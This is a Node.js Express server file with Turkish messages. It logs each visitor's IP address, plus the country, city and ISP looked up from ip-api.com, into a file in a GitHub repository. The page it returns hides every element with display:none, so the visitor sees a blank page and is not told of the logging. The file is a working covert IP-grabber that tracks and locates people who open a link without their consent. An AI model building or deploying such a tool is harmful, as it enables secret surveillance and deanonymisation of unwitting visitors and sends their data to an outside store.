const express = require('express');
const { Octokit } = require("@octokit/rest");

const app = express();
const PORT = process.env.PORT || 3000;

app.set('trust proxy', true);

const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
const REPO_OWNER = process.env.REPO_OWNER;
const REPO_NAME = process.env.REPO_NAME;
const LOG_FILE_PATH = 'ips.log';

if (!GITHUB_TOKEN || !REPO_OWNER || !REPO_NAME) {
    console.error("Gerekli ortam degiskenleri ayarlanmamis!");
    process.exit(1);
}

const octokit = new Octokit({ auth: GITHUB_TOKEN });

app.get('/', async (req, res) => {
    const ipAdresi = req.ip;
    let locationInfo = { status: "fail", message: "Lokasyon bilgisi alinamadi."};

    try {
        const response = await fetch(`http://ip-api.com/json/${ipAdresi}`);
        const data = await response.json();

        if (data.status === 'success') {
            locationInfo = {
                ulke: data.country,
                sehir: data.city,
                iss: data.isp,
            };
        }
    } catch (e) {
        console.error("Geolocation API hatasi:", e);
    }

    const logEntry = `${new Date().toISOString()} - IP: ${ipAdresi} | Ülke: ${locationInfo.ulke || 'Bilinmiyor'} | Şehir: ${locationInfo.sehir || 'Bilinmiyor'} | ISS: ${locationInfo.iss || 'Bilinmiyor'}\n`;

    try {
        let currentContent = '';
        let fileSha = undefined;

        try {
            const { data: fileData } = await octokit.repos.getContent({
                owner: REPO_OWNER,
                repo: REPO_NAME,
                path: LOG_FILE_PATH,
            });
            currentContent = Buffer.from(fileData.content, 'base64').toString('utf8');
            fileSha = fileData.sha;
        } catch (error) {
            if (error.status !== 404) throw error;
        }

        const newContent = currentContent + logEntry;
        const newContentBase64 = Buffer.from(newContent).toString('base64');

        await octokit.repos.createOrUpdateFileContents({
            owner: REPO_OWNER,
            repo: REPO_NAME,
            path: LOG_FILE_PATH,
            message: `Yeni log: ${ipAdresi} - ${locationInfo.sehir || 'Bilinmiyor'}`,
            content: newContentBase64,
            sha: fileSha,
        });

        console.log(`IP ve Lokasyon basariyla GitHub'a kaydedildi: ${ipAdresi}`);
        
        res.send(`
            <h1 style="display: none;">Bilgileriniz Başarıyla Kaydedildi</h1>
            <p style="display: none;"><b>IP Adresiniz:</b> ${ipAdresi}</p>
            <p style="display: none;"><b>Tahmini Konum:</b> ${locationInfo.sehir || 'Bilinmiyor'}, ${locationInfo.ulke || 'Bilinmiyor'}</p>
            <p style="display: none;"><b>İnternet Sağlayıcınız:</b> ${locationInfo.iss || 'Bilinmiyor'}</p>
        `);

    } catch (error) {
        console.error("GitHub'a yazma hatasi:", error.message);
        res.status(500).send("Bilgiler kaydedilirken bir hata olustu.");
    }
});

app.listen(PORT, () => {
    console.log(`Sunucu ${PORT} portunda baslatildi.`);
});
